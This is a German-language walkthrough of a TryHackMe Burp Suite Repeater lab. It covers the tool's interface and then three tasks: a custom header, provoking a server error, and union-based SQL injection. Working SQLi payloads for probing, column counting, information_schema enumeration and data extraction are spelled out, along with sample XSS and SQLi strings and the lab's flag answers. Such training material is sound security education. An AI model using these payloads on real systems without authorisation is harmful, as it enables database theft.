1 Was ist der Burp Suite Repeater?

Der Repeater ist eines der zentralen Werkzeuge in Burp Suite. Er erlaubt es, HTTP(S)-Anfragen beliebig oft abzuschicken, zu modifizieren und die Antworten des Servers direkt zu analysieren — ohne dass ein Browser involviert ist.

Kernfunktion: Burp Suite Repeater ermöglicht es, abgefangene Requests manuell zu bearbeiten und beliebig oft an das Ziel zu senden — ideal für iteratives Testen von Schwachstellen.
🔄

Wiederholen

Requests exakt identisch oder leicht verändert beliebig oft absenden.

✏️

Modifizieren

Parameter, Header, Body und Methode direkt im Editor anpassen.

🔍

Analysieren

Server-Antworten im Detail untersuchen — Status, Header, Body.

Wann wird der Repeater eingesetzt?

SzenarioBeschreibungBeispiel
SQLi SQL-Injection manuell testen und Payloads verfeinern ' OR 1=1--
XSS Cross-Site-Scripting-Payloads iterativ einschleusen <script>alert(1)</script>
Auth Authentifizierungs-Bypässe und Token-Manipulation testen Header manipulieren
API API-Endpunkte auf fehlerhafte Eingaben und Logikfehler testen Parameter verändern
Error Server-Fehler provozieren um Stack-Traces / Infos zu erhalten Ungültige Werte senden

Repeater vs. andere Burp-Tools

Repeater

Manuelles, iteratives Testen. Volle Kontrolle über jeden Request. Ideal für präzise Exploits und Analyse.

Intruder

Automatisiertes Fuzzing mit Wordlisten. Gut für Brute-Force, Parameter-Fuzzing. Weniger Kontrolle pro Request.

Scanner

Automatische Schwachstellensuche (nur Pro). Schnell, aber weniger präzise als manuelles Testen.

Proxy

Abfangen und Weiterleiten von Requests. Ausgangspunkt: Requests werden von hier an den Repeater gesendet.

2 Interface & Oberfläche

Das Repeater-Interface besteht aus sechs Hauptbereichen. Das Verständnis der Oberfläche ist essenziell für effizientes Arbeiten.

① Request List Tabs für mehrere gleichzeitige Requests (z.B. Request 1, Request 2 ...)
② Request Controls Send • Cancel • < Vorherige Antwort • Nächste Antwort >
③ Request View
Editierbarer HTTP-Request
③ Response View
Server-Antwort (read-only)
④ Layout Options Horizontal / Vertikal / Tabs
⑥ Target IP:Port
⑤ Inspector Panel Strukturierte Darstellung: Query-Parameter, Headers, Cookies, Body, Request-Attribute

Detailbeschreibung der Bereiche

① Request List (Tabs)

Oben im Repeater-Fenster. Hier können mehrere HTTP-Requests als separate Tabs verwaltet werden. Neue Tabs entstehen durch Senden weiterer Requests aus dem Proxy.

② Request Controls

Die Steuerungsleiste enthält:

  • Send — Request abschicken und Antwort empfangen
  • Cancel — Laufenden Request abbrechen
  • < / > — Durch die Verlaufshistorie navigieren (undo/redo für Requests)
③ Request- und Response-Ansicht

Der Request-Bereich links ist vollständig editierbar. Hier werden Methode, URL, Header und Body manuell angepasst. Der Response-Bereich rechts zeigt die Serverantwort nach dem Senden — nur lesbar, aber in verschiedenen Formaten darstellbar.

④ Layout Options

Drei Darstellungsoptionen für Request und Response nebeneinander:

  • Horizontal — Request oben, Response unten
  • Vertikal — Request links, Response rechts (Standard)
  • Tabs — Request und Response in separaten Tabs
⑤ Inspector Panel

Rechtes Panel. Bricht den Request/Response in strukturierte, bearbeitbare Komponenten auf — besonders hilfreich für Anfänger oder komplexe Requests.

⑥ Target Field

Zeigt die Zieladresse (IP und Port). Normalerweise automatisch gesetzt, wenn ein Request aus dem Proxy übertragen wird.

3 Response-Ansichten

Die Serverantwort kann in vier verschiedenen Modi angezeigt werden — je nach Anwendungsfall:

Pretty (Standard)

Automatisch formatierter und eingerückter Code. Ideal für HTML, JSON oder XML-Antworten. Erhöht die Lesbarkeit erheblich.

Empfohlen
Raw

Rohe, unformatierte Serverantwort exakt so wie empfangen. Enthält alle HTTP-Header und den Body ohne Veränderung.

Analyse
Hex

Hexadezimale Byte-Darstellung der Antwort. Unverzichtbar bei Binärdaten, Bildern, komprimierten Inhalten oder zur Low-Level-Analyse.

Binärdaten
Render

Rendert die HTML-Antwort browserähnlich. Zeigt wie eine Seite aussieht — ohne JavaScript-Ausführung.

Visuell
💡
Tipp: Wann welche Ansicht? Bei der Suche nach Flags oder versteckten Daten im HTML-Code immer Pretty verwenden. Für Binary-Exploits den Hex-Modus. Um zu sehen, wie die manipulierte Seite aussieht: Render.

4 Inspector Panel

Das Inspector-Panel auf der rechten Seite des Repeaters zerlegt den HTTP-Request und die Response in strukturierte, bearbeitbare Sektionen. Besonders für Anfänger bietet es eine übersichtlichere Alternative zum direkten Bearbeiten des Raw-Requests.

Request Inspector

SektionInhalt
Request AttributesHTTP-Methode, Protokoll-Version, Ressourcenpfad
Query ParametersGET-Parameter aus der URL (?key=value)
Body ParametersPOST-Daten im Request-Body
Request CookiesAlle gesendeten Cookies
Request HeadersHTTP-Header wie User-Agent, Content-Type

Response Inspector

SektionInhalt
Response CookiesVom Server gesetzte Cookies (Set-Cookie)
Response HeadersAlle Server-Antwort-Header
⚠️
Wichtig Änderungen im Inspector werden sofort in den Raw-Request übernommen — beide Ansichten sind synchronisiert.

5 Task 1 – Custom Header hinzufügen

Ziel: Einen Request an den Server senden und durch Hinzufügen des Headers FlagAuthorised: True eine Flag freischalten.

Ablauf

Request im Proxy abfangen

Im Browser FoxyProxy aktivieren (Burp Suite als Proxy konfiguriert). Die Zielseite aufrufen und den Request im Proxy-Tab abfangen.

An Repeater senden

Im Proxy-Tab: Rechtsklick auf den abgefangenen Request → Send to Repeater (oder Tastenkürzel Ctrl+R). Zum Repeater-Tab wechseln.

Ersten Test-Send

Request ohne Änderungen mit Send absenden und die normale Serverantwort begutachten.

Header hinzufügen

Im Request-Editor am Ende des Header-Blocks (nach dem letzten Header, vor der Leerzeile) folgende Zeile einfügen:

FlagAuthorised: True
Request erneut senden

Mit Send abschicken. In der Response-Ansicht (Pretty-Modus) die Flag im HTML-Body suchen.

Beispiel-Request

GET / HTTP/1.1
Host: MACHINE_IP
User-Agent: Mozilla/5.0 ...
Accept: text/html,application/xhtml+xml,...
Connection: close
FlagAuthorised: True
💡
Alternative: Inspector verwenden Über das Inspector-Panel → Request Headers → Add kann der Header auch ohne direktes Editieren des Raw-Texts hinzugefügt werden.
🚩
Task 1 – Flag
THM{Yzg5NTU2NDM0YWI1ZDNiOTc1NjBhNjUz}

6 Task 2 – Server Error (500) auslösen

Ziel: Einen Request an den /products/<ID>-Endpunkt senden und durch Übergabe eines ungültigen (nicht-numerischen) Wertes einen HTTP 500-Fehler provozieren.

Hintergrund: Warum ist das wichtig?

Server-Fehler (500 Internal Server Error) offenbaren oft wertvolle Informationen:

  • Stack-Traces mit Dateipfaden und Zeilennummern
  • Verwendete Programmiersprache und Framework-Version
  • Datenbankfehler mit SQL-Abfrage-Fragmenten
  • Interne Variablennamen und Logik

Ablauf

Produkt-Request abfangen

Im Browser ein Produkt aufrufen (z.B. /products/1). Den Request im Proxy abfangen und an den Repeater senden.

Normalen Request testen

Request mit /products/1 absenden → HTTP 200, normale Produktseite.

Ungültigen Wert einfügen

Die Zahl in der URL durch einen ungültigen Wert ersetzen:

GET /products/abc HTTP/1.1

Oder durch einen sehr langen String, negativen Wert, oder Sonderzeichen.

Response analysieren

Nach dem Senden erscheint ein HTTP 500-Fehler. In der Response die Flag suchen — sie ist oft im Error-HTML eingebettet.

Beispiel-Requests und Responses

NORMALER REQUEST (200)

GET /products/1 HTTP/1.1
Host: MACHINE_IP

→ HTTP/1.1 200 OK

MANIPULIERTER REQUEST (500)

GET /products/abc HTTP/1.1
Host: MACHINE_IP

→ HTTP/1.1 500 Internal Server Error
⚠️
Praxisrelevanz In realen Anwendungen sollten 500-Fehler niemals Stack-Traces oder interne Details preisgeben. Fehlerbehandlung ist ein kritischer Sicherheitsaspekt (Security Misconfiguration — OWASP A05:2021).
🚩
Task 2 – Flag
THM{N2MzMzFhMTBjMmIzZGExNmRmMjE2YzNj}

7 Task 3 – Union SQL Injection

Ziel: Eine Union-Based SQL Injection im /about/<ID>-Endpunkt ausnutzen, um die Notizen des CEO aus der Datenbank zu exfiltrieren.

Was ist Union-Based SQLi?

Bei einer Union-Based SQL Injection wird der UNION-Operator genutzt, um eine zusätzliche SELECT-Abfrage an die originale Datenbankabfrage anzuhängen. Das Ergebnis der eingeschleusten Abfrage wird dann zusammen mit den originalen Daten zurückgegeben.

Voraussetzungen für UNION SQLi:
  • Beide SELECT-Abfragen müssen die gleiche Anzahl an Spalten haben
  • Die Datentypen der Spalten müssen kompatibel sein
  • Die Anwendung muss die Ergebnisse im Response anzeigen
Request abfangen

Einen Aufruf von /about/1 im Proxy abfangen und an den Repeater senden.

Verwundbarkeit bestätigen

Ein Apostroph ans Ende der ID anhängen um einen SQL-Fehler auszulösen:

GET /about/1' HTTP/1.1

Ein Datenbank-Fehler bestätigt die Verwundbarkeit. Der Fehlermeldung entnehmen wir den Tabellennamen: people

Spaltenanzahl ermitteln

Mit ORDER BY die Anzahl der Spalten herausfinden:

GET /about/1 ORDER BY 1--   → OK
GET /about/1 ORDER BY 2--   → OK
GET /about/1 ORDER BY 5--   → OK
GET /about/1 ORDER BY 6--   → Fehler → 5 Spalten!
Spaltennamen aus information_schema lesen

Spaltennamen der Tabelle people aus dem Systemkatalog auslesen:

GET /about/0 UNION ALL SELECT
  group_concat(column_name),
  null,null,null,null
FROM information_schema.columns
WHERE table_name="people"--

Ergebnis: id, name, position, notes, pfp

Zieldaten exfiltrieren

Die notes-Spalte des CEO (ID=1) aus der people-Tabelle auslesen:

GET /about/0 UNION ALL SELECT
  notes,null,null,null,null
FROM people
WHERE id=1--

In der Response erscheinen die CEO-Notizen mit der enthaltenen Flag.

🚩
Task 3 – Flag (in CEO Notes)
THM{ZGE3OTUyZGMyMzkzNmZlZGFkMzNiNGRh}

8 SQLi Methodik im Detail

Die vollständige Methodik für Union-Based SQL Injection, wie im TryHackMe-Modul demonstriert:

Phase 1: Reconnaissance

Zuerst wird die Verwundbarkeit durch Sonderzeichen bestätigt. Der einfachste Test ist ein einzelner Apostroph:

-- Test auf SQL Injection
/about/1'
/about/1"
/about/1`

-- Erwartete Reaktion bei verwundbarer Anwendung:
-- HTTP 500 oder Datenbankfehlermeldung

Phase 2: Spaltenanzahl bestimmen

Zwei Methoden zur Ermittlung der Spaltenanzahl:

METHODE 1: ORDER BY

-- Erhöhen bis Fehler
/about/1 ORDER BY 1--
/about/1 ORDER BY 2--
/about/1 ORDER BY 3--
...
-- Fehler bei N → N-1 Spalten

METHODE 2: UNION SELECT NULL

-- NULLs hinzufügen bis OK
UNION SELECT null--
UNION SELECT null,null--
UNION SELECT null,null,null--
...
-- Kein Fehler → Anzahl gefunden

Phase 3: Datenbankstruktur auslesen

-- Alle Tabellen in der aktuellen Datenbank
/about/0 UNION ALL SELECT
  group_concat(table_name),null,null,null,null
FROM information_schema.tables
WHERE table_schema=database()--

-- Alle Spalten einer spezifischen Tabelle
/about/0 UNION ALL SELECT
  group_concat(column_name),null,null,null,null
FROM information_schema.columns
WHERE table_name="people"--
💡
Warum ID=0? Durch die Verwendung von 0 als ID statt 1 stellen wir sicher, dass die originale Abfrage keine Zeilen zurückgibt — so erscheinen nur die Daten aus unserem UNION-Select in der Response.

Phase 4: Daten exfiltrieren

-- Gezielte Datenextraktion: CEO-Notizen
/about/0 UNION ALL SELECT
  notes,       -- Zielspalte
  null,        -- Platzhalter
  null,
  null,
  null
FROM people
WHERE id=1   -- CEO hat ID 1
--           -- Rest der originalen Abfrage auskommentieren

URL-Kodierung beachten

Manche Sonderzeichen müssen URL-kodiert werden, wenn sie direkt in der URL stehen. Im Repeater kann der Request-Body oder der URL-Pfad direkt ohne Kodierung bearbeitet werden — Burp übernimmt die Kodierung beim Senden.

ZeichenURL-KodiertBedeutung
'%27String-Delimiter
"%22String-Delimiter
%20 / +Leerzeichen
#%23MySQL-Kommentar
----+-SQL-Kommentar
